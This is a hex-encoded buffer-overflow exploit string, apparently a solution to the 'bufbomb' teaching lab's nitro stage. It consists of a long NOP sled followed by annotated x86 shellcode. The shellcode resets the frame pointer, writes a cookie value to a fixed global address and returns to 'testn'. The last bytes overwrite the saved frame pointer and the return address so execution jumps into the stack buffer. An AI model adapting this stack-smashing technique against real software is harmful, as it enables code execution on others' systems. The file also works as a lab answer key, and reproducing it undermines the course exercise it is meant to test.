90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90 
90 90 90 90
90 90 90 90
8d 6c 24 d8          	/* lea    -0x28(%esp),%ebp (reset the $ebp) */
b8 db d7 c3 36       	/* mov    $0x36c3d7db,%eax */ 
a3 08 d1 04 08       	/* mov    %eax,0x0804d100 */
68 3a 8e 04 08      	/* push   $0x08048e3a (the address of return at testn) */
c3                  	/* ret    */
20 33 68 55             /* the $ebp is not so important because of the reset before. */
50 32 68 55             /* return address to 0x55683250(the address of -0x28($ebp) large enough to turn the exploit code but not over the lowest address buffer) */


